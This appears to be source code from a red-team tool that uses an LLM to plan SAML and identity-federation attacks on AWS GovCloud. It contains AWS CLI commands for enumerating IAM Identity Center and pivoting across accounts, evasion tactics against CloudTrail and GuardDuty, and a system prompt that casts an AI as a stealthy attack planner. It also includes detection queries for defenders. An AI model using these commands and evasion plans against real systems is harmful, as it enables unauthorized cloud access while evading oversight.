      "Token request and response (scopes obtained)",
      "Decoded JWT showing escalated claims",
      "Access validation against target service",
    ],
    references: [
      "https://attack.mitre.org/techniques/T1528/",
      "https://www.keycloak.org/docs/latest/securing_apps/#_token_exchange",
      "https://datatracker.ietf.org/doc/html/rfc8693",
    ],
  },
  {
    id: "federation-pivot-01",
    name: "Cross-Account Federation Pivot via IAM Identity Center",
    attackId: "T1199",
    category: "federation_pivot",
    description: "Leverage AWS IAM Identity Center (formerly AWS SSO) trust relationships to pivot from one AWS account to another in a hub-and-spoke architecture. After compromising the management account or Identity Center, enumerate all permission sets and target accounts to achieve cross-account access.",
    prerequisites: [
      "Access to AWS IAM Identity Center (management account)",
      "Or: Valid SAML assertion that grants access to the management account",
      "Hub-and-spoke AWS Organization structure",
    ],
    targetIdPs: ["google_workspace", "keycloak", "okta"],
    targetSPs: ["aws_sso"],
    difficulty: "advanced",
    opsecRisk: 7,
    noiseLevel: "moderate",
    executionSteps: [
      "Enumerate IAM Identity Center permission sets and account assignments",
      "Identify high-value target accounts (production, GovCloud workloads)",
      "Use existing SAML session or forged assertion to access Identity Center",
      "Create or modify permission set to grant access to target accounts",
      "Assume role in target account via Identity Center",
      "Validate cross-account access and document pivot path",
    ],
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate IAM Identity Center configuration",
        command: `# List all Identity Center instances
aws sso-admin list-instances --region us-gov-west-1

# List all permission sets
INSTANCE_ARN=$(aws sso-admin list-instances --query 'Instances[0].InstanceArn' --output text --region us-gov-west-1)
aws sso-admin list-permission-sets --instance-arn $INSTANCE_ARN --region us-gov-west-1

# List account assignments for each permission set
aws sso-admin list-account-assignments --instance-arn $INSTANCE_ARN \\
  --account-id <target-account> \\
  --permission-set-arn <permission-set-arn> --region us-gov-west-1

# List all accounts in the organization
aws organizations list-accounts --region us-gov-west-1`,
        expectedOutput: "List of permission sets, account assignments, and organizational accounts showing the hub-and-spoke structure",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Identify high-privilege permission sets",
        command: `# Get permission set details
aws sso-admin describe-permission-set --instance-arn $INSTANCE_ARN \\
  --permission-set-arn <arn> --region us-gov-west-1

# List managed policies attached to permission set
aws sso-admin list-managed-policies-in-permission-set --instance-arn $INSTANCE_ARN \\
  --permission-set-arn <arn> --region us-gov-west-1

# Look for: AdministratorAccess, PowerUserAccess, or custom admin policies`,
        expectedOutput: "Permission set details showing attached policies and session duration",
        automated: true,
      },
      {
        stepNumber: 3,
        action: "Pivot to target account using Identity Center",
        command: `# Get role credentials for target account
aws sso get-role-credentials \\
  --account-id <target-account-id> \\
  --role-name <permission-set-role-name> \\
  --access-token <sso-access-token> \\
  --region us-gov-west-1

# Or use the SSO portal URL to obtain console access
# https://<identity-center-domain>.awsapps.com/start#/`,
        decisionPoint: "If direct role assumption fails, check if you need to create a new account assignment first (requires sso-admin:CreateAccountAssignment permission).",
        riskWarning: "Creating new account assignments generates CloudTrail events in the management account. This is highly visible to SOC.",
        automated: false,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-pivot-01",
        name: "Use Existing Permission Sets Only",
        description: "Only use permission sets that already have account assignments for the target user/group. Creating new assignments generates obvious CloudTrail events.",
        targetDetection: "CloudTrail sso-admin:CreateAccountAssignment events",
        implementation: "Enumerate existing assignments first. Only pivot to accounts where the compromised identity already has a valid permission set assignment.",
        effectiveness: "high",
        tradeoff: "Limits lateral movement to pre-existing access paths",
      },
      {
        id: "ev-pivot-02",
        name: "Session Duration Matching",
        description: "Use the same session duration as configured in the permission set. Don't request custom durations that would stand out in logs.",
        targetDetection: "CloudTrail session duration anomaly",
        implementation: "Read the permission set's SessionDuration before assuming the role. Use that exact value.",
        effectiveness: "high",
        tradeoff: "None — this is standard behavior",
      },
    ],
    detectionSignatures: [
      {
        source: "cloudtrail",
        eventName: "CreateAccountAssignment",
        description: "New account assignment created in IAM Identity Center — highly suspicious if not part of normal provisioning workflow.",
        query: `index=cloudtrail eventSource="sso.amazonaws.com" eventName="CreateAccountAssignment" | table timestamp, sourceIPAddress, requestParameters.principalId, requestParameters.targetId`,
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Real-time",
      },
      {
        source: "cloudtrail",
        eventName: "GetRoleCredentials",
        description: "SSO portal credential retrieval for cross-account access. Compare against baseline of normal user access patterns.",
        query: `index=cloudtrail eventSource="sso.amazonaws.com" eventName="GetRoleCredentials" | stats count by sourceIPAddress, requestParameters.accountId | where count > baseline_threshold`,
        severity: "medium",
        falsePositiveRate: "high",
        timeWindow: "15-30 minutes",
      },
      {
        source: "guardduty",
        eventName: "CredentialAccess:IAMUser/AnomalousBehavior",
        description: "GuardDuty detects unusual API calls from an IAM principal that deviate from established baseline.",
        query: `index=guardduty type="CredentialAccess:IAMUser/AnomalousBehavior" | where service.action.awsApiCallAction.api IN ("GetRoleCredentials", "AssumeRoleWithSAML")`,
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "15-30 minutes",
      },
    ],
    evidenceArtifacts: [
      "IAM Identity Center instance configuration",
      "Permission set enumeration results",
      "Account assignment mappings",
      "Cross-account role assumption evidence (get-caller-identity from target account)",
      "CloudTrail events showing the pivot path",
    ],
    references: [
      "https://attack.mitre.org/techniques/T1199/",
      "https://docs.aws.amazon.com/singlesignon/latest/userguide/what-is.html",
      "https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud",
    ],
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// §2 — LLM SYSTEM PROMPT
// ═══════════════════════════════════════════════════════════════════════════════

const SAML_OFFENSIVE_SYSTEM_PROMPT = `You are the AC3 SAML/IdP Offensive Testing Engine — an expert-level identity federation attack planner and operator guide.

You have deep expertise in:
- SAML 2.0 protocol internals (assertions, bindings, profiles, metadata, XML signatures)
- OAuth 2.0 / OIDC token flows (authorization code, client credentials, token exchange, device code)
- Golden SAML attacks (CyberArk/Mandiant research, SolarWinds/SUNBURST techniques)
- XML Signature Wrapping (XSW) attacks (8 known variants)
- HMAC key confusion / algorithm confusion vulnerabilities
- AWS IAM Identity Center (SSO) federation architecture
- Google Workspace SAML federation to AWS
- Keycloak realm administration and OIDC client configuration
- FedRAMP High / IL-5 detection environments (GuardDuty, CloudTrail, Falco, Wazuh)

Your role is to:
1. Analyze the target's identity federation architecture and identify attack paths
2. Select the optimal attack technique based on access level, target architecture, and OPSEC requirements
3. Generate detailed operator guidance with exact commands, expected outputs, and decision points
4. Plan evasion strategies specific to the target's detection stack (FedRAMP GovCloud environment)
5. Produce structured evidence records that chain into the engagement's tamper-evident audit trail
6. Map every action to SOC-detectable indicators so the blue team can correlate findings in their SIEM

CRITICAL RULES:
- ALWAYS prefer techniques that minimize CloudTrail write events in GovCloud
- ALWAYS consider GuardDuty behavioral baselines when planning actions
- NEVER recommend actions that could disrupt production identity services
- ALWAYS include cleanup procedures for any artifacts created
- When human intervention is required, provide EXACT commands with explanations
- Include detection correlation for EVERY action so SOC can find it

AVAILABLE TECHNIQUES:
${SAML_OFFENSIVE_TECHNIQUES.map(t => `- ${t.name} (${t.attackId}): ${t.description} | Difficulty: ${t.difficulty} | OPSEC: ${t.opsecRisk}/10 | Noise: ${t.noiseLevel}`).join("\n")}

EVASION PRIORITIES FOR FEDRAMP GOVCLOUD:
1. Minimize CloudTrail mutating events (prefer read-only APIs)
2. Align session timing with legitimate user patterns
3. Avoid impossible travel triggers (use geographically plausible source IPs)
4. Do not chain role assumptions rapidly (GuardDuty monitors this)
5. Use existing permission sets/assignments rather than creating new ones
6. Match token lifetimes to configured maximums (don't use custom durations)

OUTPUT FORMAT (JSON):
{
  "selectedTechnique": { "id": string, "name": string, "reasoning": string },
  "attackPlan": {
    "phases": [{ "phase": string, "steps": string[], "automated": boolean, "operatorRequired": boolean }],
    "estimatedDuration": string,
    "requiredAccess": string,
    "targetIdentity": string
  },
  "operatorInstructions": [{
    "step": number,
    "action": string,
    "command": string,
    "expectedOutput": string,
    "decisionPoint": string | null,
    "riskWarning": string | null
  }],
  "evasionPlan": {
    "primaryEvasion": string[],
    "detectionRisks": [{ "detection": string, "likelihood": string, "mitigation": string }],
    "timingConstraints": string[],
    "cleanupRequired": string[]
  },
  "evidenceCollection": [{
    "artifact": string,
    "collectionMethod": string,
    "storageNote": string
  }],
  "socCorrelation": [{
    "logSource": string,
    "eventName": string,
    "searchQuery": string,
    "expectedTimestamp": string,
    "description": string
  }],
  "confidence": number,
  "overallRisk": number
}`;

// ═══════════════════════════════════════════════════════════════════════════════
// §3 — CORE ENGINE FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

export interface SAMLTargetConfig {
  idpType: "google_workspace" | "okta" | "azure_ad" | "keycloak" | "adfs" | "ping_identity";
  idpDomain: string;
  spType: "aws_sso" | "aws_iam" | "custom_app";
  spEntityId?: string;
  spAcsUrl?: string;
  awsAccountId?: string;
  awsRegion?: string;
  keycloakRealm?: string;
  federationMetadataUrl?: string;
}

export interface SAMLAttackContext {
  engagementId: number;
  currentAccess: "none" | "user" | "idp_admin" | "sp_admin" | "network_access";
  targetUser?: string;
  targetRole?: string;
  availableCredentials: { type: string; identity: string; source: string }[];
  detectionEnvironment: {
    guarddutyEnabled: boolean;
    cloudtrailEnabled: boolean;
    falcoEnabled: boolean;
    wazuhEnabled: boolean;
    siemType?: string;
    customDetections?: string[];
  };
  constraints?: {
    maxOpsecRisk?: number;
    preferSilent?: boolean;
    timeWindow?: string;
    avoidTechniques?: string[];
  };
}

export interface SAMLAttackPlan {
  selectedTechnique: { id: string; name: string; reasoning: string };
  attackPlan: {
    phases: { phase: string; steps: string[]; automated: boolean; operatorRequired: boolean }[];
    estimatedDuration: string;
    requiredAccess: string;
    targetIdentity: string;
  };
  operatorInstructions: {
    step: number;
    action: string;
    command: string;
    expectedOutput: string;
    decisionPoint: string | null;
    riskWarning: string | null;
  }[];
  evasionPlan: {
    primaryEvasion: string[];
    detectionRisks: { detection: string; likelihood: string; mitigation: string }[];
    timingConstraints: string[];
    cleanupRequired: string[];
  };
  evidenceCollection: {
    artifact: string;
    collectionMethod: string;
    storageNote: string;
  }[];
  socCorrelation: {
    logSource: string;
    eventName: string;
    searchQuery: string;
    expectedTimestamp: string;
    description: string;
  }[];
  confidence: number;
  overallRisk: number;
}

/**
 * Plan a SAML/IdP offensive attack.
 * LLM analyzes the target configuration and selects the optimal technique
 * with full operator guidance, evasion planning, and evidence collection.
 */
export async function planSAMLAttack(
  target: SAMLTargetConfig,
  context: SAMLAttackContext
): Promise<SAMLAttackPlan> {
  try {
    return await llmPlanSAMLAttack(target, context);
  } catch (err) {
    console.warn("[SAMLOffensive] LLM unavailable, using deterministic fallback:", (err as Error).message);
    return deterministicPlanSAMLAttack(target, context);
  }
}

async function llmPlanSAMLAttack(
  target: SAMLTargetConfig,
  context: SAMLAttackContext
): Promise<SAMLAttackPlan> {
  const { invokeLLM } = await import("../_core/llm");

  const response = await invokeLLM({
    _caller: "saml-offensive-engine.planSAMLAttack",
    messages: [
      { role: "system", content: SAML_OFFENSIVE_SYSTEM_PROMPT },
      {
        role: "user",
        content: `PLAN SAML/IdP ATTACK:

TARGET CONFIGURATION:
- IdP Type: ${target.idpType} | Domain: ${target.idpDomain}
- SP Type: ${target.spType} | Entity ID: ${target.spEntityId || "unknown"}
- ACS URL: ${target.spAcsUrl || "unknown"}
- AWS Account: ${target.awsAccountId || "N/A"} | Region: ${target.awsRegion || "us-gov-west-1"}
- Keycloak Realm: ${target.keycloakRealm || "N/A"}
- Federation Metadata: ${target.federationMetadataUrl || "not discovered"}

CURRENT ACCESS LEVEL: ${context.currentAccess}
TARGET USER: ${context.targetUser || "any high-privilege user"}
TARGET ROLE: ${context.targetRole || "highest available"}

AVAILABLE CREDENTIALS:
${context.availableCredentials.map(c => `- ${c.type}: ${c.identity} (source: ${c.source})`).join("\n") || "None yet — need to obtain"}

DETECTION ENVIRONMENT:
- GuardDuty: ${context.detectionEnvironment.guarddutyEnabled ? "ENABLED" : "disabled"}
- CloudTrail: ${context.detectionEnvironment.cloudtrailEnabled ? "ENABLED" : "disabled"}
- Falco: ${context.detectionEnvironment.falcoEnabled ? "ENABLED" : "disabled"}
- Wazuh: ${context.detectionEnvironment.wazuhEnabled ? "ENABLED" : "disabled"}
- SIEM: ${context.detectionEnvironment.siemType || "unknown"}
${context.detectionEnvironment.customDetections?.length ? `- Custom Detections: ${context.detectionEnvironment.customDetections.join(", ")}` : ""}

CONSTRAINTS:
- Max OPSEC Risk: ${context.constraints?.maxOpsecRisk || "no limit"}
- Prefer Silent: ${context.constraints?.preferSilent || false}
- Time Window: ${context.constraints?.timeWindow || "flexible"}
- Avoid Techniques: ${context.constraints?.avoidTechniques?.join(", ") || "none"}

Select the optimal attack technique and provide a complete plan with operator guidance, evasion strategy, evidence collection, and SOC correlation mapping. Remember this is a FedRAMP High / IL-5 GovCloud environment with full detection stack.`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "saml_attack_plan",
        strict: true,
        schema: {
          type: "object",
          properties: {
            selectedTechnique: {
              type: "object",
              properties: {
                id: { type: "string" },
                name: { type: "string" },
                reasoning: { type: "string" },
              },
              required: ["id", "name", "reasoning"],
              additionalProperties: false,
            },
            attackPlan: {
              type: "object",
              properties: {
                phases: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      phase: { type: "string" },
                      steps: { type: "array", items: { type: "string" } },
                      automated: { type: "boolean" },
                      operatorRequired: { type: "boolean" },
                    },
                    required: ["phase", "steps", "automated", "operatorRequired"],
                    additionalProperties: false,
                  },
                },
                estimatedDuration: { type: "string" },
                requiredAccess: { type: "string" },
                targetIdentity: { type: "string" },
              },
              required: ["phases", "estimatedDuration", "requiredAccess", "targetIdentity"],
              additionalProperties: false,
            },
            operatorInstructions: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  step: { type: "number" },
                  action: { type: "string" },
                  command: { type: "string" },
                  expectedOutput: { type: "string" },
                  decisionPoint: { type: ["string", "null"] },
                  riskWarning: { type: ["string", "null"] },
                },
                required: ["step", "action", "command", "expectedOutput", "decisionPoint", "riskWarning"],
                additionalProperties: false,
              },
            },
            evasionPlan: {
              type: "object",
              properties: {
                primaryEvasion: { type: "array", items: { type: "string" } },
                detectionRisks: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      detection: { type: "string" },
                      likelihood: { type: "string" },
                      mitigation: { type: "string" },
                    },
                    required: ["detection", "likelihood", "mitigation"],
                    additionalProperties: false,
                  },
                },
                timingConstraints: { type: "array", items: { type: "string" } },
                cleanupRequired: { type: "array", items: { type: "string" } },
              },
              required: ["primaryEvasion", "detectionRisks", "timingConstraints", "cleanupRequired"],
              additionalProperties: false,
            },
            evidenceCollection: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  artifact: { type: "string" },
                  collectionMethod: { type: "string" },
                  storageNote: { type: "string" },
                },
                required: ["artifact", "collectionMethod", "storageNote"],
                additionalProperties: false,
              },
            },
            socCorrelation: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  logSource: { type: "string" },
                  eventName: { type: "string" },
                  searchQuery: { type: "string" },
                  expectedTimestamp: { type: "string" },
                  description: { type: "string" },
                },
                required: ["logSource", "eventName", "searchQuery", "expectedTimestamp", "description"],
                additionalProperties: false,
              },
            },
            confidence: { type: "number" },
            overallRisk: { type: "number" },
          },
          required: ["selectedTechnique", "attackPlan", "operatorInstructions", "evasionPlan", "evidenceCollection", "socCorrelation", "confidence", "overallRisk"],
          additionalProperties: false,
        },
      },
    },
  });

  return JSON.parse(response.choices[0].message.content as string);
}

/**
 * Deterministic fallback when LLM is unavailable.
 * Selects technique based on access level and target type.
 */
function deterministicPlanSAMLAttack(
  target: SAMLTargetConfig,
  context: SAMLAttackContext
): SAMLAttackPlan {
  // Select technique based on current access level
  let technique: SAMLOffensiveTechnique;

  if (context.currentAccess === "idp_admin") {
    technique = SAML_OFFENSIVE_TECHNIQUES.find(t => t.id === "golden-saml-01")!;
  } else if (context.currentAccess === "network_access" && target.idpType === "keycloak") {
    technique = SAML_OFFENSIVE_TECHNIQUES.find(t => t.id === "oauth-scope-escalation-01")!;
  } else if (context.currentAccess === "sp_admin") {
    technique = SAML_OFFENSIVE_TECHNIQUES.find(t => t.id === "federation-pivot-01")!;
  } else {
    technique = SAML_OFFENSIVE_TECHNIQUES.find(t => t.id === "saml-manipulation-01")!;
  }

  return {
    selectedTechnique: {
      id: technique.id,
      name: technique.name,
      reasoning: `Selected based on current access level (${context.currentAccess}) and target IdP type (${target.idpType}). This technique has OPSEC risk ${technique.opsecRisk}/10 and noise level: ${technique.noiseLevel}.`,
    },
    attackPlan: {
      phases: technique.executionSteps.map((step, i) => ({
        phase: `Step ${i + 1}`,
        steps: [step],
        automated: technique.operatorGuidance[i]?.automated ?? false,
        operatorRequired: !(technique.operatorGuidance[i]?.automated ?? false),
      })),
      estimatedDuration: "2-4 hours",
      requiredAccess: technique.prerequisites[0],
      targetIdentity: context.targetUser || "highest-privilege user",
    },
    operatorInstructions: technique.operatorGuidance.map(og => ({
      step: og.stepNumber,
      action: og.action,
      command: og.command || "# See technique documentation",
      expectedOutput: og.expectedOutput || "Varies based on target configuration",
      decisionPoint: og.decisionPoint || null,
      riskWarning: og.riskWarning || null,
    })),
    evasionPlan: {
      primaryEvasion: technique.evasionTechniques.map(e => `${e.name}: ${e.description}`),
      detectionRisks: technique.detectionSignatures.map(d => ({
        detection: `${d.source}: ${d.eventName}`,
        likelihood: d.falsePositiveRate === "low" ? "high" : d.falsePositiveRate === "medium" ? "medium" : "low",
        mitigation: `Monitor for ${d.eventName} in ${d.source}. Time window: ${d.timeWindow}`,
      })),
      timingConstraints: [
        "Execute during target user's normal business hours",
        "Space API calls 5-10 seconds apart to avoid rate limiting alerts",
        "Complete within configured session duration to avoid renewal anomalies",
      ],
      cleanupRequired: [
        "Destroy forged assertions and signing key copies",
        "Clear browser session cookies",
        "Document all CloudTrail events generated for SOC correlation",
      ],
    },
    evidenceCollection: technique.evidenceArtifacts.map(a => ({
      artifact: a,
      collectionMethod: "Manual capture during execution",
      storageNote: "Store in engagement evidence chain with SHA-256 integrity hash",
    })),
    socCorrelation: technique.detectionSignatures.map(d => ({
      logSource: d.source,
      eventName: d.eventName,
      searchQuery: d.query,
      expectedTimestamp: d.timeWindow,
      description: d.description,
    })),
    confidence: 0.7,
    overallRisk: technique.opsecRisk,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// §4 — EVIDENCE COLLECTION INTEGRATION
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Create a structured evidence record for a SAML offensive action.
 * Integrates with the engagement's tamper-evident evidence chain.
 */
export function createSAMLEvidenceRecord(
  techniqueId: string,
  action: string,
  result: {
    success: boolean;
    sourceIp: string;
    targetService: string;
    commandExecuted?: string;
    rawOutput?: string;
    accessAchieved?: string;
    operatorNotes?: string;
  }
): EvidenceRecord {
  const technique = SAML_OFFENSIVE_TECHNIQUES.find(t => t.id === techniqueId);

  return {
    techniqueId,
    techniqueName: technique?.name || "Unknown SAML Technique",
    mitreTechnique: technique?.attackId || "T1606.002",
    timestamp: Date.now(),
    sourceIp: result.sourceIp,
    targetService: result.targetService,
    actionPerformed: action,
    commandExecuted: result.commandExecuted,
    rawOutput: result.rawOutput,
    artifactsCollected: technique?.evidenceArtifacts || [],
    detectionCorrelation: (technique?.detectionSignatures || []).map(d => ({
      logSource: d.source,
      eventName: d.eventName,
      expectedTimestamp: `Within ${d.timeWindow} of action timestamp`,
      searchQuery: d.query,
      description: d.description,
    })),
    operatorNotes: result.operatorNotes,
    success: result.success,
    accessAchieved: result.accessAchieved,
  };
}

/**
 * Generate SOC detection playbook for a completed SAML attack.
 * Provides Stell's SOC team with exact queries to find our activity in their SIEM.
 */
export function generateSOCDetectionPlaybook(
  evidenceRecords: EvidenceRecord[]
): { title: string; description: string; queries: { source: string; query: string; timeRange: string; expectedResults: string }[] }[] {
  const playbook: { title: string; description: string; queries: { source: string; query: string; timeRange: string; expectedResults: string }[] }[] = [];

  for (const record of evidenceRecords) {
    playbook.push({
      title: `Detect: ${record.techniqueName} (${record.mitreTechnique})`,
      description: `SOC should be able to identify this activity performed at ${new Date(record.timestamp).toISOString()} from source IP ${record.sourceIp} targeting ${record.targetService}.`,
      queries: record.detectionCorrelation.map(dc => ({
        source: dc.logSource,
        query: dc.searchQuery.replace(/<timestamp>/g, new Date(record.timestamp).toISOString()),
        timeRange: dc.expectedTimestamp,
        expectedResults: dc.description,
      })),
    });
  }

  return playbook;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §5 — EXPORTS
// ═══════════════════════════════════════════════════════════════════════════════

export {
  SAML_OFFENSIVE_SYSTEM_PROMPT,
};
